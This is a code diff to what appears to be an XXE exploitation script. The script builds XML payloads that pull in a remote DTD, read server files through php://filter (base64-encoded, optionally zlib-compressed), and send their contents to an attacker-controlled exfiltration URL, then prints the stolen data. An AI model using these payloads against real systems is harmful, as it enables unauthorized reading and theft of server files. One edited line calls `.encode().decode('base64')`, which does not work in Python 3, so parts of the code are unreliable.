@@ -15,9 +15,14 @@ ATTACK_TEMPLATE = """
 <!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://{dtd_url}/{b64_encoded_filename}.dtd'>%remote;%init;%trick;]>
 """
 
-DTD_TEMPLATE = """
+DTD_TEMPLATE_Z = """
 <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource={filename}">
-<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://{exfil_url}/?p=%file;'>" >
+<!ENTITY % init "<!ENTITY &#37; trick SYSTEM '{exfil_url}/?p=%file;'>" >
+"""
+
+DTD_TEMPLATE = """
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={filename}">
+<!ENTITY % init "<!ENTITY &#37; trick SYSTEM '{exfil_url}/?p=%file;'>" >
 """
 
 LAST_CONTENTS = ''
@@ -100,9 +105,9 @@ def displayContents(contents, isBase64=False):
     if LAST_CONTENTS != newContents:
         print("[+] Received response, displaying\n")
         if not isBase64:
-            print((urllib.parse.unquote(contents)))
+            print(urllib.parse.unquote(contents))
         else:
-            print((urllib.parse.unquote(contents).decode('base64')))
+            print(urllib.parse.unquote(contents).encode().decode('base64'))
         LAST_CONTENTS = newContents
         print("------\n")
     return
